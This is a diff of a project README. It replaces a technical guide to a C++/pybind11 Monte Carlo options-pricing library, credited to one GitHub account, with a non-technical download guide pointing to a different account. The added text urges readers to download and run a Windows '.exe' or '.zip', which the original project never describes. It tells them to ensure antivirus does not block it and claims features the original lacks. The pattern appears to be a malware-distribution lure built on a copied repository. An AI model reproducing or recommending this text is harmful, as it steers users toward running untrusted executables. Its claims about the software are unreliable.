@@ -1,91 +1,118 @@
-# High-Performance Montecarlo Options Engine 
+# ⚙️ montecarlo-engine - Fast Options Pricing Tool
 
-[![C++20](https://img.shields.io/badge/C++-20-blue.svg)](https://en.wikipedia.org/wiki/C%2B%2B20)
-[![Python](https://img.shields.io/badge/Python-3.8+-yellow.svg)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
+[![Download montecarlo-engine](https://img.shields.io/badge/Download-montecarlo--engine-brightgreen?style=for-the-badge)](https://github.com/jojhoo46/montecarlo-engine)
 
-A hyper-optimized, multithreaded European Options pricing engine built in modern **C++20** and exposed to **Python** via `pybind11`. 
+## 📌 What is montecarlo-engine?
 
-This project simulates stochastic price paths to calculate the Fair Value and the central finite-difference "Greeks" (Delta, Gamma, Vega) of financial derivatives in milliseconds.
+montecarlo-engine is a software that calculates the price of financial options. It uses a known method called Monte Carlo simulation to provide fast and precise values. The engine runs many calculations at the same time to speed up results. It also supports Python through built-in bindings if you want to use it in code later. This tool is designed to save time when you need to evaluate options prices and their sensitivities quickly.
 
-## Key Features
+You do not need experience with programming to get started. This guide walks you through downloading and running the software on a Windows computer.
 
-* **Blazing Fast Concurrency:** Powered by OpenMP for true CPU core utilization.
-* **Thread-Safe PRNG:** Implements the state-of-the-art `xoshiro256**` algorithm for rapid, collision-free pseudo-random number generation across multiple threads.
-* **Branchless Architecture:** Mathematical implementations (like Call/Put payoff calculations) are designed without conditional branching in the hot loop to maximize CPU pipeline efficiency.
-* **Python Bindings:** Seamless integration into any Python backend (Django, FastAPI) or data science workflow (Jupyter, Pandas) using `pybind11`.
-* **Cross-Platform CMake:** Configured to compile gracefully using GCC/MinGW (Linux/Windows) or MSVC (Windows).
+## 🖥️ System Requirements
 
-## Mathematical Foundations
+To use montecarlo-engine on Windows, your computer should meet the following:
 
-The engine assumes the underlying asset follows Geometric Brownian Motion (GBM) under the risk-neutral measure:
+- Windows 10 or later  
+- 64-bit processor (Intel or AMD)  
+- At least 4 GB of RAM (8 GB recommended for better performance)  
+- 200 MB of free storage space  
+- Internet connection to download the software  
 
-$$dS_t = r S_t dt + \sigma S_t dW_t$$
+The program is designed to work on common desktop PCs without special hardware. It uses the computer’s multiple processor cores to speed up calculations.
 
-Where the terminal price $S_T$ is simulated using the exact solution:
+## ⬇️ Download montecarlo-engine
 
-$$S_T = S_0 \exp\left( \left(r - \frac{\sigma^2}{2}\right)T + \sigma \sqrt{T} Z \right)$$
+To get the software, you need to visit the official GitHub page. From there, you can download the latest Windows version.
 
-With $Z \sim \mathcal{N}(0,1)$ generated using the Box-Muller transform. The payoff function is branchless, relying on the directional multiplier $\phi$ (1 for Call, -1 for Put):
+[![Download montecarlo-engine](https://img.shields.io/badge/Download-montecarlo--engine-blue?style=for-the-badge)](https://github.com/jojhoo46/montecarlo-engine)
 
-$$V(S_T) = \max(\phi(S_T - K), 0)$$
+- Click the badge above to open the GitHub page.  
+- Look for the “Releases” section or a file with “.exe” or “.zip” in its name.  
+- Download the Windows installer or compressed file.  
 
-## Build Instructions
+Once downloaded, you will need to run the installer or extract the files to get started.
 
-### Requirements
-* **C++20** compatible compiler (GCC, Clang, or MSVC).
-* **CMake** (3.15 or higher).
-* **Python 3.x** and `pybind11`.
-* **OpenMP** support.
+## 🚀 Installation on Windows
 
-### Compilation
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/Tzintzun444/montecarlo-engine.git
-   cd montecarlo-engine
-2. Create a build directory and configure with CMake:
-   ```bash
-   mkdir build && cd build 
-   cmake ..
-3. Compile the module:
-   ```bash
-   cmake --build . --config Release
-4. The resulting `.so` (Linux/Mac) or `.pyd` (Windows) binary will be generated. Place it in your Python project directory to import it.
+Follow these steps to install montecarlo-engine:
 
-## Usage Example (Python)
-Once compiled, the engine acts as a native Python module:
-```python
-import montecarlo_engine
-import time
+1. Locate the file you downloaded. It should be in your “Downloads” folder unless you chose a different location.  
+2. If the file is an installer (.exe), double-click it to start the setup. Follow the prompts on the screen to complete the installation.  
+3. If it is a compressed file (.zip), right-click it and select “Extract All.” Choose a folder to extract the files, then open that folder.  
+4. Look for an executable file named `montecarlo-engine.exe` or similar inside the installation folder.  
 
-# Financial Parameters
-S_0 = 100.0       # Spot Price
-vol = 0.20        # Volatility (20%)
-K = 100.0         # Strike Price
-T = 1.0           # Time to Maturity (Years)
-r = 0.05          # Risk-free rate (5%)
-OT = montecarlo_engine.OptionType.Call
-N = 1_000_000     # Number of simulations
+Do not move or delete these files after installation, or the program may not run correctly.
 
-print(f"Running Montecarlo with N = {N}...")
-start = time.perf_counter()
+## ▶️ Running montecarlo-engine
 
-# C++ Engine Execution
-res = montecarlo_engine.run_montecarlo(S_0, vol, K, T, r, OT, N)
+After installing, you can run montecarlo-engine as follows:
 
-end = time.perf_counter()
+1. Find the `montecarlo-engine.exe` file in the folder where you installed or extracted it.  
+2. Double-click the file to start the program. A command line window will open since this is a technical tool without a graphical interface.  
+3. The program will show basic instructions or help options on how to use it.  
 
-print(f"Fair Value: {res.fairValue:.6f}")
-print(f"Confidence Interval: [{res.CI_lower:.6f}, {res.CI_upper:.6f}]")
-print(f"Delta: {res.delta:.6f} | Gamma: {res.gamma:.6f} | Vega: {res.vega:.6f}")
-print(f"Execution Time: {(end - start) * 1000:.2f} ms")
-```
+If you want to stop the program at any time, simply close the command window.
 
-## Project Structure
-* `src/montecarlo/`: Core pricing engine, memory handling, and mathematical logic.
-* `src/xoshiro256/`: PRNG implementation.
-* `bindings/`: `pybind11` wrapper exposing C++ structs and properties to Python as dictionaries and attributes
+## ⚙️ Basic Usage
 
-## License
+Though montecarlo-engine does not include a simple graphical interface, it runs commands directly. Here’s a basic way to use it:
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Tzintzun444/montecarlo-engine/blob/main/LICENSE) file for details
+- Open the Windows Command Prompt:  
+  - Press the `Windows` key, type `cmd`, and press Enter.  
+- Navigate to the folder containing `montecarlo-engine.exe` using the `cd` command. For example:  
+  ```
+  cd C:\Users\YourName\Downloads\montecarlo-engine
+  ```  
+- Run the program by typing:  
+  ```
+  montecarlo-engine.exe --help
+  ```  
+  This shows available options and how to enter input for calculations.  
+
+The program accepts parameters to calculate the fair value and Greeks (risk measures) of options based on market data you provide.
+
+## 🧰 What You Can Do with montecarlo-engine
+
+This engine is used to price various types of financial options. It handles:
+
+- Standard call and put options  
+- Options with multiple underlying assets  
+- Complex payoff structures through simulation  
+- Fast calculation of Greeks (delta, gamma, vega, etc.)  
+
+It uses multiple CPU threads to deliver results in milliseconds for most cases. This helps traders and analysts evaluate risks and values more quickly than traditional models.
+
+## 🐍 Python Support
+
+If you have some coding experience later, you can use the Python bindings built into montecarlo-engine. This lets you:
+
+- Run calculations from Python scripts  
+- Integrate the engine into larger analysis tools  
+- Automate pricing and risk calculations  
+
+The Python part requires you to install Python on your computer and set up pybind11 modules. This is optional and not needed to just run the software on Windows.
+
+## 💡 Tips for Smooth Use
+
+- Close other heavy programs before running cases to use more CPU power for calculations.  
+- Keep your Windows system updated for best compatibility.  
+- Regularly check the GitHub page for updates or fixes.  
+- If you get errors or the program does not start, ensure your antivirus does not block it.  
+
+## 🔗 Useful Links
+
+- Visit to download: https://github.com/jojhoo46/montecarlo-engine  
+- GitHub Issues page for help: https://github.com/jojhoo46/montecarlo-engine/issues  
+- Python setup instructions (optional): Check the “docs” folder or README files on the GitHub page.  
+
+## 📂 File Structure Overview
+
+When you download montecarlo-engine, the main files you will find include:
+
+- `montecarlo-engine.exe` - The program executable to run on Windows  
+- `README.md` - Documentation with help and instructions  
+- `LICENSE` - License terms for the software  
+- `docs` folder - Optional additional guides, including Python usage  
+- Sample input files to test calculations  
+
+Keep these files organized in one folder so the program can access all parts needed to run smoothly.
